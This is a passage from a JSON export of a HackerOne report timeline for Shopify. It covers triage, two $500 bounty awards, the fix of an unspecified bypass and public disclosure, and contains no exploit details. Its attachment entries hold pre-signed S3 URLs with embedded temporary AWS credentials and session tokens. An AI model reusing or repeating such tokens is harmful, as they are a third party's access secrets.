LZIk23gYhvoCnzlJyh%2Bs4YT4Y9NBe%2BuO50gRcLkId0hIDo3s3rVFEHd3DeobVXe7TJmQ%2FoPHXywJmCBc5i%2FnGGtc8UW4nb1QByAu4MMgRtTUGscF6wF9Q%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cdd48025589231c0c412c55843be85151beb8d24d1aaa662fd9258e897c74854"
                },
                {
                    "id": 589444,
                    "filename": "Screenshot_from_2019-09-23_00-50-44.png",
                    "type": "image/png",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qgPJhketMviNHJFianUuAZf8?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2019-09-23_00-50-44.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2019-09-23_00-50-44.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYY3KUHY6%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T073010Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZ%2FrzMJPkXzqJKGhUDJxaKvRKOwgW3L9NoGgTQYNluwIgP%2FQUNBim5xYJkBE4bibyDr4jMY%2FqMgU8yTBdR9QfoSQquwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDDEZLUDtzsol34pf1yqPBZq6rwka9dcUmP1Z24HNrPUaSjikKtPCd8tWm8aqp4p6845zp81qitLzXk9PwD9slj3c%2BSQSWjztZWIJEXZWIIlCQ8zW3V0YeF%2BPbkNoqrw1iHYiPAXC3t9y2cnp7uesZte%2B5t1Hb%2BbmTSUMQfTPsazLeu4nH%2F9MWkcvLY34rjH54kSRBSKoSpNPgPj2kSMe0Agn9jQ102utMKoMlhVvvqtnQmOO3yY83c9MPBbCmAsuXLoVvwRyAURznumXGaAY8T%2B16canJngAP7ML%2BGxqR9a4ioL%2FIEyZSARvH%2BOf1TL1KtnyqLRmKVMht7VNGhWu30mxL%2BAZvsBaOHSbngtEExTFVCGCjgA2bXH0nM7V4nVzgSBjnCm4xHKwlKw2UGiCKE1jyfYLNBgBnjuBeFtvw%2FIXEVAwP1X%2BGxr%2BBJEndKkov5kap4UxeFIHzwNu%2BuncV7Htjx%2B5Ceg3lS1dVXtigyLqfWS9ZDcUOzUU8a%2Bc2xMZW9%2FDGUXGEivZ6wchu7US3C7TYxKEqYefV4bC7u%2BQO8geofYjAWDWujYfUQPfe2CWBUQKd0IbyyY8dVsRqXxXquWP2PWT6zzBxgu8QOuklVxDBrNLKbnQ5Xm9tuf3xELeqIHfe%2BGfDIpigjAR4iago3Vsz8V7gdnhQUBe4ae8zi26qOx8xVbJBK3TtN9dyjtmyAO%2BWWqtf2WMN8S7GtgDCOEzmPtLc6hxX9Olifu0uGtBRSb0zE0EOX16pUQ7%2FFcPTQsSLqJC4c33cv%2BYTmjfyDDgUNUS4WbOmU0UwWv4bnaXCRIk8v9ZvvpaPfvZC1lx6k6alXR4GMigA2XBEFD852wBKdWpfiKe%2B4KEwnLNAeKE4xXaAmclAQBS8jFTLsYwsJ62pwY6sQHyCoWizkYjoXsyfeuh51YDF9e38C97iPYDjIXpJSSm1TTtLU%2FTGWnKeQisJw%2FcC8RKX7KKsFxYNATPCKUXKb05GVgEvZvvRtb71Ou3fUQO2phoABIv%2FguN%2BQLZIk23gYhvoCnzlJyh%2Bs4YT4Y9NBe%2BuO50gRcLkId0hIDo3s3rVFEHd3DeobVXe7TJmQ%2FoPHXywJmCBc5i%2FnGGtc8UW4nb1QByAu4MMgRtTUGscF6wF9Q%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=53a635b3c4fede9a3a022e0c6fa14de0c540f97b4599309beee38c80487d8fa9"
                }
            ],
            "genius_execution_id": null,
            "team_handle": "shopify"
        },
        {
            "id": 5868975,
            "is_internal": false,
            "editable": false,
            "type": "Activities::BugTriaged",
            "message": "Hi @mariogh,\n\nThanks for the report, and for taking a look at our previously disclosed issues. We've validated this and notified the relevant team.",
            "automated_response": false,
            "created_at": "2019-09-23T14:05:57.560Z",
            "updated_at": "2019-09-23T14:05:57.560Z",
            "actor": {
                "username": "jack_mccracken",
                "cleared": false,
                "verified": false,
                "url": "/jack_mccracken",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "shopify"
        },
        {
            "id": 5869479,
            "is_internal": false,
            "editable": false,
            "type": "Activities::BountyAwarded",
            "message": "Thanks again for your report. We're awarding an initial $500, and will award the remainder (if any) once the issue is resolved.",
            "automated_response": false,
            "created_at": "2019-09-23T14:56:38.233Z",
            "updated_at": "2019-09-23T14:56:38.233Z",
            "actor": {
                "url": "/shopify",
                "ibb": false,
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
                },
                "profile": {
                    "name": "Shopify"
                }
            },
            "bounty_currency": "usd",
            "genius_execution_id": null,
            "team_handle": "shopify",
            "collaborator": {
                "username": "mariogh",
                "url": "/mariogh"
            }
        },
        {
            "id": 5871033,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Hello @jack_mccracken, thank you for validating my report, and thank you @clayton, I'm humbly grateful for this initial reward.\n\nWhile the team is working on this, I will keep digging and trying to find all possible workarounds and bypasses I can so we can close this issue once and forever.\n\nWill keep you posted.",
            "automated_response": false,
            "created_at": "2019-09-23T17:44:27.002Z",
            "updated_at": "2019-09-23T17:44:27.002Z",
            "actor": {
                "username": "mariogh",
                "cleared": false,
                "verified": false,
                "url": "/mariogh",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/604/582/e011880a1558c75b4d2f45466fa81102f4e71e56_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "shopify"
        },
        {
            "id": 6007504,
            "is_internal": false,
            "editable": false,
            "type": "Activities::BugResolved",
            "message": "Hi @mariogh, \n\nThe issue has been fixed and should no longer be reproducible.  We'll be in touch soon regarding a final bounty amount.\n\nThank you for your report and for helping to improve the security of Shopify.",
            "automated_response": false,
            "created_at": "2019-10-10T20:01:46.576Z",
            "updated_at": "2019-10-10T20:01:46.576Z",
            "actor": {
                "username": "colton_pauderis",
                "cleared": false,
                "verified": false,
                "url": "/colton_pauderis",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "reporter": {
                "username": "mariogh",
                "url": "/mariogh"
            },
            "genius_execution_id": null,
            "team_handle": "shopify"
        },
        {
            "id": 6007703,
            "is_internal": false,
            "editable": false,
            "type": "Activities::BountyAwarded",
            "message": "Thanks again for reporting this interesting bypass. We're awarding an additional $500, bringing the total bounty amount to $1,000. We look forward to hearing from you again soon!",
            "automated_response": false,
            "created_at": "2019-10-10T20:19:19.486Z",
            "updated_at": "2019-10-10T20:19:19.486Z",
            "actor": {
                "url": "/shopify",
                "ibb": false,
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
                },
                "profile": {
                    "name": "Shopify"
                }
            },
            "bounty_currency": "usd",
            "genius_execution_id": null,
            "team_handle": "shopify",
            "collaborator": {
                "username": "mariogh",
                "url": "/mariogh"
            }
        },
        {
            "id": 6008199,
            "is_internal": false,
            "editable": false,
            "type": "Activities::AgreedOnGoingPublic",
            "message": "",
            "automated_response": false,
            "created_at": "2019-10-10T21:34:44.119Z",
            "updated_at": "2019-10-10T21:34:44.119Z",
            "first_to_agree": true,
            "actor": {
                "username": "clayton",
                "cleared": false,
                "verified": false,
                "url": "/clayton",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "shopify"
        },
        {
            "id": 6008204,
            "is_internal": false,
            "editable": false,
            "type": "Activities::AgreedOnGoingPublic",
            "message": "",
            "automated_response": false,
            "created_at": "2019-10-10T21:35:55.313Z",
            "updated_at": "2019-10-10T21:35:55.313Z",
            "actor": {
                "username": "mariogh",
                "cleared": false,
                "verified": false,
                "url": "/mariogh",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/604/582/e011880a1558c75b4d2f45466fa81102f4e71e56_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "shopify"
        },
        {
            "id": 6008205,
            "is_internal": false,
            "editable": false,
            "type": "Activities::ReportBecamePublic",
            "message": "",
            "automated_response": false,
            "created_at": "2019-10-10T21:35:55.398Z",
            "updated_at": "2019-10-10T21:35:55.398Z",
            "actor": {
                "username": "mariogh",
                "cleared": false,
                "verified": false,
                "url": "/mariogh",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/604/582/e011880a1558c75b4d2f45466fa81102f4e71e56_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "shopify"
        }
    ],
    "activity_page_count": 1,
    "activity_page_number": 1,
    "summaries": [
        {
            "category": "team",
            "can_view?": true,
            "can_create?": false
        },
        {
            "category": "researcher",
            "can_view?": true,
            "can_create?": false
        }
    ]
}